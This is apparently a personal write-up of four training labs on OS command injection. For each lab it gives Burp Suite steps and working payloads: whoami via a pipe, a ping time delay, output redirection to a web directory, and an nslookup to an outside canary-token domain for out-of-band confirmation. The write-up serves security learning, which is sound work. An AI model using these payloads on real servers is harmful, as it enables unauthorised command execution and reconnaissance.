# **Lab 1: OS command injection, simple case**

## **AIM - To solve the lab, execute the whoami command to determine the name of the current user.**  

---

1. **Intercept the Stock Check Request:**  
 - Open **Burp Suite** and ensure **Intercept** is enabled in the **Proxy** tab.  
 - Navigate to the stock check functionality in the target web application.  
 - Submit a request to check stock levels, capturing it in **Burp Suite**.  

2. **Modify the Request:**  
 - Locate the **storeID** parameter in the intercepted request.

 - Change its value to:  
     ```
     1|whoami
     ```
 - This injection attempts to execute the `whoami` command on the server.  

3. **Forward the Modified Request:**  
 - Click **Forward** to send the modified request to the server.  

4. **Analyze the Response:**  
 - Observe that the response includes the output of the `whoami` command, revealing the current system user.

# **Lab 2: Blind OS command injection with time delays**

## **AIM - To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.**

## **Steps to Exploit the Command Injection Vulnerability**  

### **1. Intercept the Feedback Submission Request**  
- Open **Burp Suite** and ensure **interception is enabled** in the **Proxy** tab.  
- Navigate to the **feedback submission page** of the target web application.  
- Fill in the form with dummy data and submit it.
![Screenshot from 2025-01-10 18-56-43](https://github.com/user-attachments/assets/f388069f-6720-43f6-9284-27bfb3113bcf)
 
- Burp Suite will capture the request.  

---

### **2. Modify the Email Parameter for Command Injection**  
- Locate the **email parameter** in the request, which typically looks like this:  

  ```
  email=user@example.com
  ```

- Modify it to inject a **ping command**:  

  ```
  email=abc%40gmail.com||ping+-c+10+127.0.0.1||
  ```

- The `||` characters attempt to **chain a new command** after the email value.  
- `ping -c 10 127.0.0.1` sends **10 ICMP requests** to `127.0.0.1` (localhost).

---

### **3. Send the Modified Request**  
- Forward the request to the server.  
- Observe the response time in **Burp Suiteâ€™s HTTP history**.  

---

### **4. Analyze the Response**  
- The response should take approximately **10 seconds** to return.  
- This delay confirms that the **ping command was executed on the server**.  
- The web application is **vulnerable to command injection** because it does not properly sanitize user input.

**Lab 3: Blind OS command injection with output redirection**

**AIM - To solve the lab, execute the whoami command and retrieve the output.**

## **Steps to Exploit the Command Injection Vulnerability**  

### **1. Intercept the Feedback Submission Request**  
- Open **Burp Suite** and ensure **interception is enabled** in the **Proxy** tab.  
- Navigate to the **feedback submission page** of the target web application.  
- Fill in the form with dummy data and submit it.
![Screenshot from 2025-01-10 19-27-57](https://github.com/user-attachments/assets/dfe1350c-d3ea-42ac-bf6b-844228a0afcc)
 
- Burp Suite will capture the request.  
- I tried using ping command to check if its vulnerable to blind os command injection
---

### **2. Modify the Email Parameter for Command Injection**  
- Locate the **email parameter** in the request, which typically looks like this:  

  ```
  email=user@example.com
  ```

- Modify it to inject a **command that writes to a file**:  

  ```
  email=||whoami>/var/www/images/test.txt||
  ```

- This executes the `whoami` command, which returns the **current user** running the application.  
- The output is saved in `/var/www/images/test.txt`, which is a directory likely accessible via the web application.  

- Forward the modified request to the server.  

---

### **3. Retrieve the Command Output via the Image Loading Function**  
- Navigate to a **page that loads product images** in the application.  
- Intercept the request that loads an image file.  
- Locate the **filename parameter**, which usually looks like this:  

  ```
  filename=product49.jpg
  ```
![Screenshot from 2025-01-10 19-32-13](https://github.com/user-attachments/assets/62c908c3-947e-4eae-832c-e9536a8be4e5)

  Modify it to retrieve the previously created file:  
  ```
  filename=test.txt
  ```

- Forward the request and observe the response.  

---

### **4. Analyze the Response**  
- The response should contain the **output of the whoami command**, such as:  
![Screenshot from 2025-01-10 19-32-37](https://github.com/user-attachments/assets/865f3633-6ed8-4014-bedc-691ae04644ac)

  ```
  www-data
  ```

- This confirms that **arbitrary commands** can be executed on the server and their output can be retrieved.

**Lab 4: Blind OS command injection with out-of-band interaction**

**AIM - To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to your server.**

**Note - I will not be using Burp Calloborator as it is only available in Burp Suite Proffessional , instead I will be using "Canary tokens" to initiate an Out-of-band request**

# **Command Injection via Canary Token - Write-up**  


## **Steps to Exploit the Command Injection Vulnerability**  

### **1. Generate a Canary Token for DNS Lookup**  
- Visit **[CanaryTokens.org](https://canarytokens.org/)**.  
- Generate a **DNS Canary Token** and copy the unique subdomain provided (e.g., `re4ipcdhqm...canarytokens.com`).  
- This token will alert us if the server executes the injected `nslookup` command.  
![Screenshot from 2025-01-11 19-00-19](https://github.com/user-attachments/assets/fefbd29e-65bd-4dd9-8c56-d5e6c2f72879)

### **2. Intercept the Feedback Submission Request**  
- Open **Burp Suite** and enable **interception** in the **Proxy** tab.  
- Navigate to the **feedback submission page** of the target application.  
- Fill in the form with dummy data and submit it.  
- Burp Suite will capture the request.  



### **3. Modify the Email Parameter to Inject the Payload**  
- Locate the **email parameter** in the intercepted request. The original request may look like this:  

  ```
  email=user@example.com
  ```

- Modify it to execute the **nslookup command**, replacing `BURP-COLLABORATOR-SUBDOMAIN` with the **Canary Token subdomain**:  

  ```
  email=x||nslookup+x.re4ipcdhqm455600fn3x0nh4.canarytokens.com||
  ```

- This injection attempts to **resolve the Canary Token subdomain**, which will trigger an alert if successful.  

---

### **4. Forward the Modified Request**  
- Send the modified request to the server using Burp Suite.  
- If the server executes the command, it will perform a **DNS lookup** on the Canary Token subdomain.  
![Screenshot from 2025-01-11 19-12-10](https://github.com/user-attachments/assets/ce06b1f3-9197-4113-811c-68fecdf30433)

---

### **5. Verify Execution via Canary Tokens**  
- Check your email or the **Canary Tokens dashboard** for an alert.  
- If the DNS request was executed, you will see a notification indicating that the token was **resolved by the target server**.

## **Conclusion**  
This write-up demonstrates how a **command injection vulnerability** can be exploited using **Canary Tokens** instead of **Burp Collaborator**. By injecting an `nslookup` command, we confirmed whether the server executed our payload, revealing a serious security flaw that could lead to **Remote Code Execution**.
